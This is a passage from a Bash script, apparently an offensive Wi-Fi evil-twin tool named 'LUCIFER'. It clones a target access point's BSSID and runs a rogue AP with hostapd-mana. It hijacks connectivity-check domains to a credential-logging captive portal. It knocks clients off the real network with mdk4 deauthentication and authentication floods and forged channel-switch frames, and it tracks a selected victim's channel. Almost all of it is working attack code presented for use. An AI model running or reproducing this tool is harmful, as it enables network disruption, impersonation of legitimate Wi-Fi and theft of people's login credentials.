address=/ipv6.msftconnecttest.com/${PORTAL_IP}
address=/msftncsi.com/${PORTAL_IP}
address=/www.msftncsi.com/${PORTAL_IP}

# Android connectivity check domains
address=/connectivitycheck.gstatic.com/${PORTAL_IP}
address=/clients3.google.com/${PORTAL_IP}
address=/connectivitycheck.android.com/${PORTAL_IP}

# Firefox captive portal check
address=/detectportal.firefox.com/${PORTAL_IP}

# Catch-all wildcard
address=/#/${PORTAL_IP}
EOF
}

# --- NETWORKING ---
setup_networking() {
    echo -e "${BLUE}[*] Configuring network stack...${NC}"

    # hostapd-mana already owns the interface in AP mode.
    # We only layer on L3 config and firewall rules.

    ip addr add "${PORTAL_IP}/24" dev "$AP_IFACE" 2>/dev/null

    iptables --flush
    iptables -t nat --flush

    iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 80 \
        -j DNAT --to-destination "${PORTAL_IP}:80"

    iptables -A FORWARD -i "$AP_IFACE" -p tcp --dport 443 -j DROP
    iptables -A INPUT -i "$AP_IFACE" -p tcp --dport 443 -j DROP

    iptables -A INPUT -i "$AP_IFACE" -p udp --dport 53 -j ACCEPT
    iptables -A INPUT -i "$AP_IFACE" -p udp --dport 67 -j ACCEPT
    iptables -A INPUT -i "$AP_IFACE" -p tcp --dport 80 -j ACCEPT

    echo 1 > /proc/sys/net/ipv4/ip_forward

    iptables -P FORWARD DROP
    iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

    echo -e "${GREEN}[+] Network stack ready.${NC}"
}

# --- BSSID CLONING ---
clone_target_bssid() {
    if [ -z "$T_BSSID" ]; then
        echo -e "${YELLOW}[!] No target BSSID to clone.${NC}"
        CLONED_BSSID=0
        return
    fi

    echo -e "${BLUE}[*] Cloning target BSSID to AP interface...${NC}"

    ip link set "$AP_IFACE" down
    sleep 0.5

    if command -v macchanger &>/dev/null; then
        macchanger -m "$T_BSSID" "$AP_IFACE" >/dev/null 2>&1
    else
        ip link set "$AP_IFACE" address "$T_BSSID" 2>/dev/null
    fi

    sleep 0.3

    # Verify via sysfs (readable while interface is DOWN)
    local new_mac
    new_mac=$(cat /sys/class/net/"$AP_IFACE"/address 2>/dev/null)

    if [ "${new_mac,,}" = "${T_BSSID,,}" ]; then
        echo -e "${GREEN}[+] MAC cloned successfully: $new_mac${NC}"
        CLONED_BSSID=1
    else
        echo -e "${RED}[!] Failed to clone MAC. Driver locked. Current: $new_mac${NC}"
        CLONED_BSSID=0
    fi

    # Interface stays DOWN — hostapd-mana will bring it up in AP mode
}

# --- START SERVICES ---
start_hostapd() {
    echo -e "${BLUE}[*] Starting hostapd-mana...${NC}"

    # Interface must be DOWN. hostapd-mana brings it up in AP mode via nl80211.
    ip link set "$AP_IFACE" down 2>/dev/null
    sleep 0.3

    hostapd-mana /tmp/hostapd.conf > /tmp/hostapd.log 2>&1 &
    HOSTAPD_PID=$!
    track_pid $HOSTAPD_PID

    # hostapd-mana needs time to:
    #   1. nl80211 SET_INTERFACE → AP mode
    #   2. nl80211 START_AP → begin beaconing
    #   3. Set channel and bring interface operationally UP
    sleep 3

    if ! kill -0 "$HOSTAPD_PID" 2>/dev/null; then
        echo -e "${RED}[!] hostapd-mana failed to start:${NC}"
        tail -n 20 /tmp/hostapd.log
        exit 1
    fi

    # Secondary check: verify interface is actually in AP mode
    local mode
    mode=$(iw dev "$AP_IFACE" info 2>/dev/null | grep type | awk '{print $2}')
    if [ "$mode" != "AP" ]; then
        echo -e "${RED}[!] hostapd started but interface not in AP mode (mode=$mode)${NC}"
        echo -e "${RED}    Check /tmp/hostapd.log${NC}"
        tail -n 20 /tmp/hostapd.log
        exit 1
    fi

    echo -e "${GREEN}[+] hostapd-mana running (PID $HOSTAPD_PID) — interface in AP mode${NC}"
}

start_dnsmasq() {
    echo -e "${BLUE}[*] Starting dnsmasq...${NC}"
    dnsmasq -C /tmp/dnsmasq.conf --log-queries --log-facility=/tmp/dnsmasq.log &
    track_pid $!
    sleep 1

    if ! pgrep -x dnsmasq >/dev/null; then
        echo -e "${RED}[!] dnsmasq failed to start. Check /tmp/dnsmasq.log${NC}"
        tail -n 10 /tmp/dnsmasq.log
        exit 1
    fi

    echo -e "${GREEN}[+] dnsmasq running${NC}"
}

start_portal() {
    echo -e "${BLUE}[*] Starting portal server...${NC}"
    python3 "$SCRIPT_DIR/lucifer_portal.py" \
        --bind "$PORTAL_IP" \
        --port 80 \
        --portal-dir "$PORTAL_DIR" \
        --creds-log "$CREDS_LOG" \
        --portal-ip "$PORTAL_IP" > /tmp/portal.log 2>&1 &
    PORTAL_PID=$!
    track_pid $PORTAL_PID

    sleep 1
    if ! kill -0 "$PORTAL_PID" 2>/dev/null; then
        echo -e "${RED}[!] Portal server failed to start:${NC}"
        tail -n 10 /tmp/portal.log
        exit 1
    fi
    echo -e "${GREEN}[+] Portal server running (PID $PORTAL_PID)${NC}"
}

# --- CHANNEL UTILITIES ---

ch_to_freq() {
    local ch="$1"
    if [ "$ch" -le 14 ]; then
        [ "$ch" -eq 14 ] && echo 2484 && return
        echo $(( 2407 + ch * 5 ))
    else
        echo $(( 5000 + ch * 5 ))
    fi
}

is_dfs_channel() {
    local ch="$1"
    # UNII-2 (52-64) and UNII-2 Extended (100-144)
    # Kernel enforces 60s CAC before tx — useless for short dwell injection
    [[ "$ch" -ge 52 && "$ch" -le 64 ]] && return 0
    [[ "$ch" -ge 100 && "$ch" -le 144 ]] && return 0
    return 1
}

set_monitor_channel() {
    local iface="$1"
    local ch="$2"
    local freq
    freq=$(ch_to_freq "$ch")

    # iw is the only reliable path for 5GHz.
    # HT20 is correct for management frame injection — deauth and
    # CSA are mandatory-rate frames on the primary 20MHz subchannel.
    # VHT80 clients decode the primary 20 for all mgmt frames per
    # 802.11-2020 §10.6.6.
    if ! iw dev "$iface" set freq "$freq" 2>/dev/null; then
        ip link set "$iface" down 2>/dev/null
        iw dev "$iface" set freq "$freq" 2>/dev/null
        ip link set "$iface" up 2>/dev/null
    fi

    # Verify — bail early if the driver refused
    local actual_ch
    actual_ch=$(iw dev "$iface" info 2>/dev/null \
        | awk '/channel/{print $2}')
    if [ "$actual_ch" != "$ch" ]; then
        return 1
    fi
    return 0
}

# --- PROCESS MANAGEMENT ---

kill_verified() {
    local pid="$1"

    # Already dead?
    kill -0 "$pid" 2>/dev/null || return 0

    # SIGTERM
    kill "$pid" 2>/dev/null

    # Grace window: 5 × 200ms = 1s
    local i=0
    while [ $i -lt 5 ]; do
        kill -0 "$pid" 2>/dev/null || return 0
        sleep 0.2
        (( i++ ))
    done

    # Escalate: children first (mdk4 spawns internal threads),
    # then parent, both with SIGKILL
    pkill -9 -P "$pid" 2>/dev/null
    kill -9 "$pid" 2>/dev/null
    wait "$pid" 2>/dev/null
}

sweep_orphans() {
    local iface="$1"
    # Belt-and-suspenders: catch anything kill_verified missed
    # from a previous iteration or a prior crashed run
    local stale
    stale=$(pgrep -f "mdk4 $iface" 2>/dev/null)
    if [ -n "$stale" ]; then
        echo "$stale" | xargs kill -9 2>/dev/null
    fi
    stale=$(pgrep -f "lucifer_csa.py.*--iface $iface" 2>/dev/null)
    if [ -n "$stale" ]; then
        echo "$stale" | xargs kill -9 2>/dev/null
    fi
    sleep 0.1
}

kill_attack_wave() {
    local pids=("$@")
    for pid in "${pids[@]}"; do
        kill_verified "$pid"
    done
}

# --- DISSOCIATION CYCLE (called inside subshell — function makes `local` valid) ---
target_loop() {
    local CAPTURE_ANNOUNCED=0
    local LAST_CLIENT_CH=""
    local PREV_REPORTED_CH=""
    local attack_pids=()

    trap 'kill_attack_wave "${attack_pids[@]}"; exit 0' TERM INT

    echo "$T_CH" > /tmp/.pincer_target_ch

    while true; do
        attack_pids=()
        local client_ch="unknown"
        local lock_ch="$T_CH"

        # Gate 1: capture check
        if [ -n "$TARGET_CLIENT" ]; then
            if check_client_captured "$TARGET_CLIENT"; then
                if [ "${CAPTURE_ANNOUNCED}" -eq 0 ]; then
                    echo -e "${GREEN}    ★ TARGET CAPTURED — holding attack${NC}" >&2
                    CAPTURE_ANNOUNCED=1
                fi
                sleep 15
                if check_client_captured "$TARGET_CLIENT"; then
                    continue
                fi
                echo -e "${YELLOW}    [*] Client left rogue — resuming${NC}" >&2
                CAPTURE_ANNOUNCED=0
            fi
        fi

        # Gate 2: sense client location (Option B — fast check)
        if [ -n "$TARGET_CLIENT" ]; then
            client_ch=$(sense_client_channel \
                "$TARGET_CLIENT" "${LAST_CLIENT_CH:-}")

            if [ "$client_ch" != "unknown" ]; then
                lock_ch="$client_ch"
                LAST_CLIENT_CH="$client_ch"
                echo "$client_ch" > /tmp/.pincer_target_ch

                if [ "$client_ch" != "${PREV_REPORTED_CH:-}" ]; then
                    echo -e "${CYAN}    [sense] Client on CH ${client_ch}${NC}" >&2
                    PREV_REPORTED_CH="$client_ch"
                fi
            fi
        fi

        sweep_orphans "$MON_TARGET"

        if ! set_monitor_channel "$MON_TARGET" "$lock_ch"; then
            sleep 1
            continue
        fi

        local target_bssids=()
        for entry in "${MESH_TARGETS[@]}"; do
            [ "${entry%%:*}" = "$lock_ch" ] && \
                target_bssids+=("${entry#*:}")
        done

        if [ ${#target_bssids[@]} -eq 0 ]; then
            sleep 1
            continue
        fi

        local target_file="/tmp/target_pincer_primary.txt"
        printf '%s\n' "${target_bssids[@]}" > "$target_file"

        local dwell=5
        attack_pids=()

        if [ "$PMF_ENABLED" -lt 2 ]; then
            mdk4 "$MON_TARGET" d -b "$target_file" \
                >/dev/null 2>&1 &
            attack_pids+=($!)
        fi

        if [ "$AUTH_FLOOD" -eq 1 ]; then
            for bssid in "${target_bssids[@]}"; do
                mdk4 "$MON_TARGET" a -a "$bssid" -m \
                    >/dev/null 2>&1 &
                attack_pids+=($!)
            done
        fi

        for bssid in "${target_bssids[@]}"; do
            python3 "$SCRIPT_DIR/lucifer_csa.py" \
                --iface "$MON_TARGET" \
                --bssid "$bssid" \
                --ssid "$T_ESSID" \
                --channel "$lock_ch" \
                --target-channel "$FAKE_CH" \
                --duration "$dwell" \
                >/dev/null 2>&1 &
            attack_pids+=($!)
        done

        sleep "$dwell"
        kill_attack_wave "${attack_pids[@]}"
    done
}

suppress_loop() {
    local attack_pids=()

    trap 'kill_attack_wave "${attack_pids[@]}"; exit 0' TERM INT

    while true; do
        if [ -n "$TARGET_CLIENT" ]; then
            if check_client_captured "$TARGET_CLIENT"; then
                sleep 15
                continue
            fi
        fi

        sweep_orphans "$MON_SUPPRESS"

        local skip_ch="$T_CH"
        [ -f /tmp/.pincer_target_ch ] && \
            skip_ch=$(cat /tmp/.pincer_target_ch)

        local suppress_dwell=3

        for ch in "${MESH_CHANNELS[@]}"; do
            [ "$ch" = "$skip_ch" ] && continue
            is_dfs_channel "$ch" && continue

            if ! set_monitor_channel "$MON_SUPPRESS" "$ch"; then
                continue
            fi

            local ch_bssids=()
            for entry in "${MESH_TARGETS[@]}"; do
                [ "${entry%%:*}" = "$ch" ] && \
                    ch_bssids+=("${entry#*:}")
            done
            [ ${#ch_bssids[@]} -eq 0 ] && continue

            local ch_file="/tmp/target_suppress_ch${ch}.txt"
            printf '%s\n' "${ch_bssids[@]}" > "$ch_file"

            attack_pids=()

            if [ "$PMF_ENABLED" -lt 2 ]; then
                mdk4 "$MON_SUPPRESS" d -b "$ch_file" \
                    >/dev/null 2>&1 &
                attack_pids+=($!)
            fi

            if [ "$AUTH_FLOOD" -eq 1 ]; then
                for bssid in "${ch_bssids[@]}"; do
                    mdk4 "$MON_SUPPRESS" a -a "$bssid" -m \
                        >/dev/null 2>&1 &
                    attack_pids+=($!)
                done
            fi

            for bssid in "${ch_bssids[@]}"; do
                python3 "$SCRIPT_DIR/lucifer_csa.py" \
                    --iface "$MON_SUPPRESS" \
                    --bssid "$bssid" \
                    --ssid "$T_ESSID" \
                    --channel "$ch" \
                    --target-channel "$FAKE_CH" \
                    --duration "$suppress_dwell" \
                    >/dev/null 2>&1 &
                attack_pids+=($!)
            done

            sleep "$suppress_dwell"
            kill_attack_wave "${attack_pids[@]}"
        done
    done
}

# --- CLIENT DISCOVERY ---

discover_target_client() {
    CSV=$(ls ${SCAN_FILE}*.csv 2>/dev/null | head -n 1)
    if [ -z "$CSV" ]; then
        echo -e "${YELLOW}[!] No scan data — adaptive tracking disabled${NC}"
        TARGET_CLIENT=""
        return
    fi

    echo -e "\n${BLUE}[*] Discovering clients on target network...${NC}"

    # Build lookup table of all target BSSIDs
    declare -A valid_bssids
    for entry in "${MESH_TARGETS[@]}"; do
        local bssid="${entry#*:}"
        valid_bssids["${bssid,,}"]=1
    done

    local in_station=0
    local client_entries=()

    while IFS= read -r line; do
        if echo "$line" | grep -q "Station MAC"; then
            in_station=1
            continue
        fi
        [ "$in_station" -eq 0 ] && continue

        local sta_mac sta_power sta_bssid
        sta_mac=$(echo "$line" | awk -F',' '{print $1}' | tr -d '[:space:]')
        sta_power=$(echo "$line" | awk -F',' '{print $4}' | tr -d '[:space:]')
        sta_bssid=$(echo "$line" | awk -F',' '{print $6}' | tr -d '[:space:]')

        [[ ! "$sta_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && continue
        [[ "$sta_power" == "-1" || -z "$sta_power" ]] && continue

        if [ -n "${valid_bssids[${sta_bssid,,}]}" ]; then
            local already=0
            for existing in "${client_entries[@]}"; do
                [[ "${existing%%|*}" == "$sta_mac" ]] && already=1 && break
            done
            [ "$already" -eq 0 ] && \
                client_entries+=("$sta_mac|$sta_power|$sta_bssid")
        fi
    done < "$CSV"

    if [ ${#client_entries[@]} -eq 0 ]; then
        echo -e "${YELLOW}[!] No clients found on target network${NC}"
        echo -e "${YELLOW}    Adaptive tracking disabled — weighted dwell${NC}"
        TARGET_CLIENT=""
        return
    fi

    # Sort by signal strength (least negative = strongest)
    IFS=$'\n' client_entries=($(
        printf '%s\n' "${client_entries[@]}" | sort -t'|' -k2 -nr
    ))
    unset IFS

    echo "-------------------------------------------------------"
    printf "%-4s %-18s %-5s %-18s\n" \
        "ID" "CLIENT MAC" "PWR" "ASSOCIATED TO"
    echo "-------------------------------------------------------"

    local i=1
    for entry in "${client_entries[@]}"; do
        IFS='|' read -r mac pwr bssid <<< "$entry"
        printf "%-4s %-18s %-5s %-18s\n" "$i" "$mac" "$pwr" "$bssid"
        (( i++ ))
    done

    echo "-------------------------------------------------------"
    echo -e " [0] Skip — weighted dwell instead"
    echo ""

    while true; do
        read -p "Select client to track [0-${#client_entries[@]}]: " c_choice

        if [ "$c_choice" = "0" ] || [ -z "$c_choice" ]; then
            TARGET_CLIENT=""
            echo -e "${YELLOW}[*] Adaptive tracking disabled${NC}"
            return
        fi

        if [[ "$c_choice" =~ ^[0-9]+$ ]] \
            && [ "$c_choice" -ge 1 ] \
            && [ "$c_choice" -le "${#client_entries[@]}" ]; then

            local selected="${client_entries[$((c_choice-1))]}"
            IFS='|' read -r TARGET_CLIENT _ TARGET_CLIENT_BSSID \
                <<< "$selected"

            echo -e "${GREEN}[+] Tracking: $TARGET_CLIENT${NC}"
            echo -e "${GREEN}    Last seen on: $TARGET_CLIENT_BSSID${NC}"
            return
        fi

        echo -e "${RED}[!] Invalid selection.${NC}"
    done
}

# --- CLIENT SENSING ---

sense_client_channel() {
    local client_mac="$1"
    local last_known="$2"

    # Build scan order: last-known channel first to minimize hop time
    local scan_order=()
    if [ -n "$last_known" ] && [ "$last_known" != "unknown" ]; then
        scan_order+=("$last_known")
    fi
    for ch in "${MESH_CHANNELS[@]}"; do
        [ "$ch" = "$last_known" ] && continue
        is_dfs_channel "$ch" && continue
        scan_order+=("$ch")
    done

    for ch in "${scan_order[@]}"; do
        set_monitor_channel "$MON_TARGET" "$ch" || continue

        # BPF on monitor interface: "ether src" maps to 802.11 addr2
        # (transmitter). Catches data, probes, auth, assoc from client.
        # -c 1: exit on first match
        # timeout 0.3: 300ms window — active clients transmit every
        # ~100ms (null data keepalives in power save)
        if timeout 0.3 tcpdump -i "$MON_TARGET" -c 1 -q \
            "ether src $client_mac" 2>/dev/null | grep -q .; then
            echo "$ch"
            return 0
        fi
    done

    echo "unknown"
    return 1
}

# --- CAPTURE DETECTION ---

check_client_captured() {
    local mac="$1"
    local mac_lower="${mac,,}"

    # hostapd-mana logs "AP-STA-CONNECTED" on association
    if grep -qi "AP-STA-CONNECTED.*${mac_lower}" \
        /tmp/hostapd.log 2>/dev/null; then

        # Verify still connected: check it hasn't disconnected since
        local last_connect last_disconnect
        last_connect=$(grep -ci "AP-STA-CONNECTED.*${mac_lower}" \
            /tmp/hostapd.log 2>/dev/null)
        last_disconnect=$(grep -ci "AP-STA-DISCONNECTED.*${mac_lower}" \
            /tmp/hostapd.log 2>/dev/null)

        # More connects than disconnects = currently associated
        if [ "${last_connect:-0}" -gt "${last_disconnect:-0}" ]; then
            return 0
        fi
    fi

    # dnsmasq lease file (active DHCP lease = client is on our network)
    if [ -f /tmp/dnsmasq.leases ] && \
        grep -qi "$mac_lower" /tmp/dnsmasq.leases 2>/dev/null; then
        return 0
    fi

    # ARP table on AP interface (L3 reachability = definitely here)
    if ip neigh show dev "$AP_IFACE" 2>/dev/null \
        | grep -qi "$mac_lower"; then
        return 0
    fi

    return 1
}

# --- ENTRY POINT ---
start_dissociation() {
    echo -e "\n${RED}[*] Starting dissociation engine...${NC}"

    > /tmp/target.txt
    for entry in "${MESH_TARGETS[@]}"; do
        echo "${entry#*:}" >> /tmp/target.txt
    done

    local total_bssids=${#MESH_TARGETS[@]}
    local total_channels=${#MESH_CHANNELS[@]}

    if [ "$IS_MESH" -eq 1 ]; then
        echo -e "${RED}    MESH MODE: ${total_bssids} BSSIDs across ${total_channels} channels${NC}"
    fi

    case "$PMF_ENABLED" in
        0) echo -e "${CYAN}    No PMF → Deauth + CSA + Auth Flood${NC}" ;;
        1) echo -e "${YELLOW}    PMF CAPABLE → Deauth (legacy) + CSA + Auth Flood${NC}" ;;
        2) echo -e "${YELLOW}    PMF REQUIRED → CSA + Auth Flood only${NC}" ;;
    esac

    if [ -n "$TARGET_CLIENT" ]; then
        echo -e "${GREEN}    ADAPTIVE TRACKING: $TARGET_CLIENT${NC}"
    else
        echo -e "${YELLOW}    WEIGHTED DWELL (no client tracking)${NC}"
    fi

    local dfs_count=0
    local active_channels=0
    for ch in "${MESH_CHANNELS[@]}"; do
        if is_dfs_channel "$ch"; then
            (( dfs_count++ ))
        else
            (( active_channels++ ))
        fi
    done
    if [ $dfs_count -gt 0 ]; then
        echo -e "${YELLOW}    ${dfs_count} DFS channel(s) skipped${NC}"
    fi

    # Target loop — locked to client's channel
    target_loop &
    TARGET_PID=$!
    track_pid $TARGET_PID

    # Suppress loop — sibling channels
    suppress_loop &
    SUPPRESS_PID=$!
    track_pid $SUPPRESS_PID

    echo -e "${GREEN}[+] Pincer attack running${NC}"
    echo -e "${CYAN}    Target lock: PID $TARGET_PID ($MON_TARGET)${NC}"
    echo -e "${CYAN}    Suppression: PID $SUPPRESS_PID ($MON_SUPPRESS)${NC}"

}

resolve_attack_strategy() {
    AUTH_FLOOD=1

    if [ "$SECURITY_MODE" == "WPA2" ]; then
        AUTH_FLOOD=0
        log STATUS "Auth flood OFF — WPA2 mode, PSK handles reassociation"
    elif [ "$PMF_ENABLED" -eq 2 ]; then
        AUTH_FLOOD=0
        log STATUS "Auth flood OFF — PMF required, AP will rate-limit"
    elif [ -n "$TARGET_CLIENT" ]; then
        AUTH_FLOOD=0
        log STATUS "Auth flood OFF — single client tracking, surgical mode"
    else
        log STATUS "Auth flood ON — aggressive broadcast disruption"
    fi
}

# --- CREDENTIAL MONITOR ---
start_monitor() {
    xterm -geometry 80x24 -bg black -fg green \
        -T "LUCIFER — CREDENTIALS" \
        -e "echo 'Waiting for credentials...'; echo ''; tail -f $CREDS_LOG" &
    track_pid $!
    XTERM_PID=$!
}

# --- MAIN ---
main() {
    pre_cleanup
    check_root
    show_intro
    check_deps

    # Phase 1: Hardware setup
    set_regulatory_domain
    setup_interfaces

    # Phase 2: Intelligence gathering
    scan_networks
    collect_mesh_siblings
    discover_target_client

    # Phase 3: User inputs
    select_template
    select_security_mode
    setup_portal
    select_rogue_channel
    resolve_attack_strategy
    # Phase 4: Execution — ORDER MATTERS
    #
    # Step 1: Clone MAC while interface is raw/managed and DOWN
    clone_target_bssid

    # Step 2: Generate configs (needs CLONED_BSSID result from step 1)
    generate_hostapd_conf
    generate_dnsmasq_conf

    # Step 3: hostapd-mana takes ownership of interface (DOWN → AP mode)
    start_hostapd

    # Step 4: Layer IP on top of hostapd's AP-mode interface
    setup_networking

    # Step 5: Services that depend on working L3
    start_dnsmasq
    start_portal

    # Step 6: Attack vectors
    start_dissociation
    start_monitor

    echo ""
    echo -e "${GREEN}======================================================${NC}"
    echo -e "${GREEN} LUCIFER — ATTACK ACTIVE${NC}"
    echo -e "${GREEN}======================================================${NC}"
    echo -e " Target AP:    ${CYAN}$T_ESSID${NC} ($T_BSSID)"
    echo -e " Target CH:    ${CYAN}$T_CH${NC}"
    echo -e " Tracking:     ${CYAN}$([ -n "$TARGET_CLIENT" ] && echo "$TARGET_CLIENT (adaptive)" || echo "none (weighted dwell)")${NC}"
    echo -e " Rogue CH:     ${CYAN}$FAKE_CH${NC}"
    echo -e " Mode:         ${CYAN}$SECURITY_MODE${NC}"
    echo -e " BSSID Cloned: ${CYAN}$([ "$CLONED_BSSID" -eq 1 ] && echo "YES" || echo "NO")${NC}"
    echo -e " PMF Detected: ${CYAN}$(if [ "$PMF_ENABLED" -eq 0 ]; then echo "NO"; elif [ "$PMF_ENABLED" -eq 1 ]; then echo "CAPABLE"; else echo "REQUIRED"; fi)${NC}"
    echo -e " Auth Flood:   ${CYAN}$([ "$AUTH_FLOOD" -eq 1 ] && echo "ON" || echo "OFF")${NC}"
    echo -e " Portal:       ${CYAN}http://${PORTAL_IP}/${NC}"
    echo -e " Creds Log:    ${CYAN}$CREDS_LOG${NC}"
    echo -e "${GREEN}======================================================${NC}"
    echo ""
    read -p "Press ENTER to stop and clean up..."
}

main
